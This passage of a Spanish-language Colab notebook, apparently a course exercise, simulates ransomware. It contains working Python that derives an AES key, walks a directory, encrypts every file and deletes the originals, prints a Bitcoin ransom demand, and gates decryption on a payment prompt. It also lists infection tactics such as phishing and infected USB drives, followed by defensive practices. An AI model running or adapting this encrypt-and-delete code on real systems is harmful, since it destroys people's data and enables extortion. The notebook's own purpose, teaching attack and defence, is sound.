        "    print(\"[INFO] Secreto compartido firmado por la víctima.\")\n",
        "\n",
        "    # Paso 4: El atacante descifra el secreto usando su llave privada de corto plazo\n",
        "    decrypted_secret = decrypt_message(attacker_short_term_key, encrypted_secret)\n",
        "    print(\"[INFO] Secreto descifrado por el atacante:\", decrypted_secret.hex())\n",
        "\n",
        "    # Paso 5: El atacante verifica la firma del secreto\n",
        "    is_valid_signature = verify_signature(victim_cert[\"pk\"], decrypted_secret, signature)\n",
        "\n",
        "    if is_valid_signature:\n",
        "        print(\"[SUCCESS] La firma del secreto compartido es válida.\")\n",
        "    else:\n",
        "        print(\"[ERROR] La firma del secreto compartido no es válida.\")\n",
        "\n",
        "    # Verificar si el intercambio fue exitoso\n",
        "    if shared_secret == decrypted_secret:\n",
        "        print(\"[SUCCESS] El intercambio AKE v.2 fue exitoso.\")\n",
        "        return shared_secret\n",
        "    else:\n",
        "        print(\"[ERROR] El secreto no coincide.\")\n",
        "        return None\n",
        "\n",
        "# Generar certificados para el atacante y la víctima\n",
        "attacker_cert, attacker_key = generate_certificate(\"Attacker\")\n",
        "victim_cert, victim_key = generate_certificate(\"Victim\")\n",
        "\n",
        "# Simular intercambio\n",
        "shared_secret = ake_v2_with_short_term_keys(attacker_cert, victim_cert, attacker_key, victim_key)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_kdv7dR4fCfj",
        "outputId": "da17b3ac-5858-4ef7-e7cb-95fd037c8954"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "[INFO] Llaves de corto plazo generadas para ambas partes.\n",
            "[INFO] Secreto compartido generado por la víctima: 3a1da48b2329b3849be0b722e175587fc27160105ebde81ba96012352182a1a9837167203ebf578a76a48d55fce25ea5c79bdc1ccc09aa0b08cb8a066520ec3027e627e6f3e512dfcbb9d933eed5e6559b269ce5fa3b9e14ebdd86797bfc4e7d1b6cc65f273c401523ae7eb5411ddac0085ee5e5891aa036964791bf9f4c91b1\n",
            "[INFO] Secreto cifrado enviado al atacante.\n",
            "[INFO] Secreto compartido firmado por la víctima.\n",
            "[INFO] Secreto descifrado por el atacante: 3a1da48b2329b3849be0b722e175587fc27160105ebde81ba96012352182a1a9837167203ebf578a76a48d55fce25ea5c79bdc1ccc09aa0b08cb8a066520ec3027e627e6f3e512dfcbb9d933eed5e6559b269ce5fa3b9e14ebdd86797bfc4e7d1b6cc65f273c401523ae7eb5411ddac0085ee5e5891aa036964791bf9f4c91b1\n",
            "[SUCCESS] La firma del secreto compartido es válida.\n",
            "[SUCCESS] El intercambio AKE v.2 fue exitoso.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Punto 3.  \n",
        "Genera una llave simétrica usando una KDF y usa esta llave para cifrar archivos almacenados en la máquina víctima"
      ],
      "metadata": {
        "id": "BwdRbIED1gX4"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "--------------------------------------------------------------\n",
        "Generación de la llave simétrica: Se utiliza una **HKDF con SHA-256** para derivar una llave de 256 bits a partir del secreto común y un salt fijo.\n",
        "\n",
        "Cifrado de archivos: Cada archivo se **cifra usando AES en modo CBC.**\n",
        "Se genera un IV único por archivo, que se almacena al principio del archivo cifrado.\n",
        "\n",
        "Escaneo de directorio: El script recorre todos los archivos dentro de un directorio especificado (/content/ en Colab por defecto).\n",
        "Cifra cada archivo, excluyendo aquellos ya cifrados (con extensión .enc).\n",
        "\n",
        "Notificación del ransomware: Muestra una lista de archivos cifrados y la cantidad de \"rescate\" a pagar en BTC."
      ],
      "metadata": {
        "id": "CH72ZA2_k2xj"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# --- CONFIGURACIÓN ---\n",
        "SALT = os.urandom(16)  # Genera una salt aleatoria de 16 bytes para HKDF\n",
        "IV_SIZE = 16\n",
        "KEY_SIZE = 32  # AES-256 (32 bytes)\n",
        "RANSOM_AMOUNT = 0.05  # Ejemplo: cantidad simulada a pagar\n",
        "\n",
        "# --- FUNCIONES ---\n",
        "\n",
        "def generate_symmetric_key(secret_common, salt):\n",
        "    \"\"\"\n",
        "    Genera una llave simétrica usando HKDF con SHA-256.\n",
        "    \"\"\"\n",
        "    return HKDF(secret_common, KEY_SIZE, salt, SHA256)\n",
        "\n",
        "def encrypt_file(file_path, key):\n",
        "    \"\"\"\n",
        "    Cifra un archivo utilizando AES en modo CBC.\n",
        "    \"\"\"\n",
        "    # Generar IV aleatorio\n",
        "    iv = os.urandom(IV_SIZE)\n",
        "    cipher = AES.new(key, AES.MODE_CBC, iv)\n",
        "\n",
        "    # Leer y cifrar el contenido del archivo\n",
        "    with open(file_path, 'rb') as f:\n",
        "        plaintext = f.read()\n",
        "    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))\n",
        "\n",
        "    # Guardar el archivo cifrado (incluyendo el IV al inicio)\n",
        "    encrypted_file_path = file_path + \".enc\"\n",
        "    with open(encrypted_file_path, 'wb') as f:\n",
        "        f.write(iv + ciphertext)\n",
        "\n",
        "    # Eliminar el archivo original (simula el comportamiento del ransomware)\n",
        "    os.remove(file_path)\n",
        "    return encrypted_file_path\n",
        "\n",
        "def scan_and_encrypt(directory, key):\n",
        "    \"\"\"\n",
        "    Escanea un directorio en busca de archivos y los cifra.\n",
        "    \"\"\"\n",
        "    encrypted_files = []\n",
        "    for root, _, files in os.walk(directory):\n",
        "        for file in files:\n",
        "            file_path = os.path.join(root, file)\n",
        "            # Cifra solo archivos no cifrados previamente\n",
        "            if not file_path.endswith(\".enc\"):\n",
        "                encrypted_file_path = encrypt_file(file_path, key)\n",
        "                encrypted_files.append(encrypted_file_path)\n",
        "    return encrypted_files\n",
        "\n",
        "def notify_ransom(encrypted_files):\n",
        "    \"\"\"\n",
        "    Notifica los archivos cifrados y el monto a pagar.\n",
        "    \"\"\"\n",
        "    print(\"\\n[ALERTA] Archivos cifrados con éxito:\")\n",
        "    for file in encrypted_files:\n",
        "        print(f\" - {file}\")\n",
        "    print(f\"\\nPara recuperar sus archivos, debe pagar: ${RANSOM_AMOUNT} BTC\")\n",
        "    print(\"Por favor contacte con el atacante para más detalles.\\n\")\n",
        "\n",
        "# --- SIMULACIÓN ---\n",
        "\n",
        "# Ruta donde se encuentran los archivos (en Colab, puedes usar '/content/')\n",
        "directory_to_encrypt = '/content/'\n",
        "\n",
        "# Generar la llave simétrica usando HKDF\n",
        "symmetric_key = generate_symmetric_key(shared_secret, SALT)\n",
        "print(\"[INFO] Llave simétrica generada con HKDF.\")\n",
        "\n",
        "# Escanear y cifrar archivos\n",
        "encrypted_files = scan_and_encrypt(directory_to_encrypt, symmetric_key)\n",
        "\n",
        "# Notificar al usuario sobre los archivos cifrados y el monto\n",
        "notify_ransom(encrypted_files)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "JxKdYfuuk3Wu",
        "outputId": "e4166589-baa8-4d21-804c-92941189ef89"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "[INFO] Llave simétrica generada con HKDF.\n",
            "\n",
            "[ALERTA] Archivos cifrados con éxito:\n",
            " - /content/.config/config_sentinel.enc\n",
            " - /content/.config/.last_survey_prompt.yaml.enc\n",
            " - /content/.config/gce.enc\n",
            " - /content/.config/.last_opt_in_prompt.yaml.enc\n",
            " - /content/.config/active_config.enc\n",
            " - /content/.config/.last_update_check.json.enc\n",
            " - /content/.config/default_configs.db.enc\n",
            " - /content/.config/hidden_gcloud_config_universe_descriptor_data_cache_configs.db.enc\n",
            " - /content/.config/logs/2024.11.22/14.22.50.932478.log.enc\n",
            " - /content/.config/logs/2024.11.22/14.22.50.282297.log.enc\n",
            " - /content/.config/logs/2024.11.22/14.22.27.331185.log.enc\n",
            " - /content/.config/logs/2024.11.22/14.22.06.423354.log.enc\n",
            " - /content/.config/logs/2024.11.22/14.22.39.624516.log.enc\n",
            " - /content/.config/logs/2024.11.22/14.22.38.495163.log.enc\n",
            " - /content/.config/configurations/config_default.enc\n",
            " - /content/sample_data/anscombe.json.enc\n",
            " - /content/sample_data/README.md.enc\n",
            " - /content/sample_data/mnist_train_small.csv.enc\n",
            " - /content/sample_data/mnist_test.csv.enc\n",
            " - /content/sample_data/california_housing_train.csv.enc\n",
            " - /content/sample_data/california_housing_test.csv.enc\n",
            "\n",
            "Para recuperar sus archivos, debe pagar: $0.05 BTC\n",
            "Por favor contacte con el atacante para más detalles.\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Puntos 4 y 5.\n",
        "Notificacion - Pago - Liberacion de Archivos"
      ],
      "metadata": {
        "id": "SL1z6TCw1orr"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "--------------------------------------------------------------\n",
        "Proceso de descifrado: La función decrypt_file extrae el IV almacenado en el archivo cifrado y utiliza la llave simétrica generada previamente para descifrar los datos.\n",
        "Los archivos descifrados se guardan con su nombre original, eliminando la extensión .enc.\n",
        "\n",
        "Simulación del pago: Se solicita al usuario confirmar si ha realizado el pago mediante una entrada de texto.\n",
        "Si el pago se confirma, el ransomware genera la misma llave simétrica con la HKDF y descifra los archivos.\n",
        "\n",
        "Notificación tras descifrado: La función notify_decryption lista todos los archivos descifrados y confirma al usuario que los archivos han sido recuperados.\n",
        "\n",
        "Simulación controlada:\n",
        "\n",
        "Todo el proceso está diseñado para simular el comportamiento sin impacto real fuera de un entorno de prueba."
      ],
      "metadata": {
        "id": "v6nbAWWaxJgg"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def decrypt_file(file_path, key):\n",
        "    \"\"\"\n",
        "    Descifra un archivo previamente cifrado con AES en modo CBC.\n",
        "    \"\"\"\n",
        "    with open(file_path, 'rb') as f:\n",
        "        iv = f.read(IV_SIZE)  # Leer el IV almacenado al inicio del archivo\n",
        "        ciphertext = f.read()  # Leer el resto del archivo (datos cifrados)\n",
        "\n",
        "    cipher = AES.new(key, AES.MODE_CBC, iv)\n",
        "    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)\n",
        "\n",
        "    # Guardar el contenido descifrado en un nuevo archivo (elimina \".enc\")\n",
        "    decrypted_file_path = file_path.replace('.enc', '')\n",
        "    with open(decrypted_file_path, 'wb') as f:\n",
        "        f.write(plaintext)\n",
        "\n",
        "    # Eliminar el archivo cifrado\n",
        "    os.remove(file_path)\n",
        "    return decrypted_file_path\n",
        "\n",
        "def scan_and_decrypt(directory, key):\n",
        "    \"\"\"\n",
        "    Escanea un directorio en busca de archivos cifrados y los descifra.\n",
        "    \"\"\"\n",
        "    decrypted_files = []\n",
        "    for root, _, files in os.walk(directory):\n",
        "        for file in files:\n",
        "            file_path = os.path.join(root, file)\n",
        "            # Descifrar solo archivos con extensión \".enc\"\n",
        "            if file_path.endswith(\".enc\"):\n",
        "                decrypted_file_path = decrypt_file(file_path, key)\n",
        "                decrypted_files.append(decrypted_file_path)\n",
        "    return decrypted_files\n",
        "\n",
        "def notify_decryption(decrypted_files):\n",
        "    \"\"\"\n",
        "    Notifica al usuario que los archivos han sido descifrados.\n",
        "    \"\"\"\n",
        "    print(\"\\n[INFO] Archivos descifrados con éxito:\")\n",
        "    for file in decrypted_files:\n",
        "        print(f\" - {file}\")\n",
        "    print(\"\\nGracias por completar el pago. Sus archivos han sido recuperados.\\n\")\n",
        "\n",
        "# --- SIMULACIÓN DEL PAGO Y DESCIFRADO ---\n",
        "\n",
        "# Simulación del pago\n",
        "print(\"[ALERTA] Para recuperar sus archivos, realice el pago de rescate.\")\n",
        "payment_confirmation = input(\"¿Ha realizado el pago (si/no)? \").strip().lower()\n",
        "\n",
        "if payment_confirmation == 'si':\n",
        "    print(\"\\n[INFO] Pago confirmado. Enviando instrucciones de descifrado...\")\n",
        "\n",
        "    # Generar la llave simétrica para descifrar\n",
        "    decryption_key = generate_symmetric_key(shared_secret, SALT)\n",
        "    print(\"[INFO] Llave simétrica generada con HKDF para descifrado.\")\n",
        "\n",
        "    # Escanear y descifrar los archivos\n",
        "    decrypted_files = scan_and_decrypt(directory_to_encrypt, decryption_key)\n",
        "\n",
        "    # Notificar al usuario\n",
        "    notify_decryption(decrypted_files)\n",
        "else:\n",
        "    print(\"\\n[ALERTA] El pago no se ha realizado. No es posible recuperar los archivos.\\n\")\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "2hzDrb3hxI-S",
        "outputId": "cce9349c-48dd-4bd3-882e-7424295747ea"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "[ALERTA] Para recuperar sus archivos, realice el pago de rescate.\n",
            "¿Ha realizado el pago (si/no)? si\n",
            "\n",
            "[INFO] Pago confirmado. Enviando instrucciones de descifrado...\n",
            "[INFO] Llave simétrica generada con HKDF para descifrado.\n",
            "\n",
            "[INFO] Archivos descifrados con éxito:\n",
            " - /content/.config/.last_survey_prompt.yaml\n",
            " - /content/.config/gce\n",
            " - /content/.config/hidden_gcloud_config_universe_descriptor_data_cache_configs.db\n",
            " - /content/.config/.last_update_check.json\n",
            " - /content/.config/config_sentinel\n",
            " - /content/.config/.last_opt_in_prompt.yaml\n",
            " - /content/.config/active_config\n",
            " - /content/.config/default_configs.db\n",
            " - /content/.config/logs/2024.11.22/14.22.27.331185.log\n",
            " - /content/.config/logs/2024.11.22/14.22.39.624516.log\n",
            " - /content/.config/logs/2024.11.22/14.22.06.423354.log\n",
            " - /content/.config/logs/2024.11.22/14.22.50.282297.log\n",
            " - /content/.config/logs/2024.11.22/14.22.38.495163.log\n",
            " - /content/.config/logs/2024.11.22/14.22.50.932478.log\n",
            " - /content/.config/configurations/config_default\n",
            " - /content/sample_data/california_housing_test.csv\n",
            " - /content/sample_data/california_housing_train.csv\n",
            " - /content/sample_data/mnist_test.csv\n",
            " - /content/sample_data/mnist_train_small.csv\n",
            " - /content/sample_data/README.md\n",
            " - /content/sample_data/anscombe.json\n",
            "\n",
            "Gracias por completar el pago. Sus archivos han sido recuperados.\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Preguntas Finales"
      ],
      "metadata": {
        "id": "z8nRkcp80pc5"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Rol del atacante: Estrategias para infectar la máquina de la víctima"
      ],
      "metadata": {
        "id": "l8DUJTsG0a2n"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Los atacantes pueden utilizar correos electrónicos de phishing personalizados, simulando facturas pendientes o confirmaciones de envío con archivos adjuntos maliciosos. Estos correos, diseñados con base en la información de la víctima, aumentan la probabilidad de que descargue y ejecute el ransomware. Otra estrategia común es comprometer sitios web legítimos, insertando malware que se descarga automáticamente cuando la víctima visita la página.\n",
        "\n",
        "Otra táctica efectiva es distribuir USB infectados en áreas públicas o laborales, aprovechando la curiosidad de las personas para conectar estos dispositivos. Además, los atacantes pueden usar exploits técnicos, como vulnerabilidades en sistemas desactualizados, para propagar el ransomware en redes internas. Por último, campañas en redes sociales o mensajería instantánea, con enlaces engañosos como “Mira este video sobre ti”, incrementan la distribución mediante los contactos de la víctima.\n",
        "\n",
        "Estas estrategias se basan en la combinación de técnicas de ingeniería social y vulnerabilidades técnicas para maximizar la eficacia de la infección, adaptándose tanto al comportamiento humano como a debilidades tecnológicas."
      ],
      "metadata": {
        "id": "lXE63mrIzG2O"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Rol del defensor: Políticas y prácticas de ciberseguridad"
      ],
      "metadata": {
        "id": "r2-FAh850kBY"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Para garantizar la confidencialidad, es crucial implementar controles de acceso, como la autenticación multifactor (MFA) y políticas de privilegio mínimo. Cifrar datos sensibles, tanto en tránsito como en reposo, asegura que la información permanezca protegida, incluso si los atacantes la obtienen. Capacitar a los empleados sobre riesgos como el phishing también ayuda a reducir el vector humano de ataque.\n",
        "\n",
        "La integridad se protege mediante la gestión de parches y actualizaciones para corregir vulnerabilidades y el uso de herramientas como sistemas de detección de intrusos (IDS/IPS) o soluciones EDR para identificar comportamientos maliciosos. Realizar escaneos regulares de archivos y redes con antivirus y antimalware es igualmente fundamental para prevenir infecciones.\n",
        "\n",
        "Para mantener la disponibilidad, se deben realizar copias de seguridad periódicas y almacenarlas fuera de línea o en la nube con políticas de versionado. Diseñar planes de recuperación ante desastres garantiza una respuesta rápida en caso de ataque, mientras que la segmentación de redes y la limitación del uso de macros y extensiones ejecutables minimizan la propagación del ransomware."
      ],
      "metadata": {
        "id": "5w-V8nX60eAL"
      }
    }
  ]
}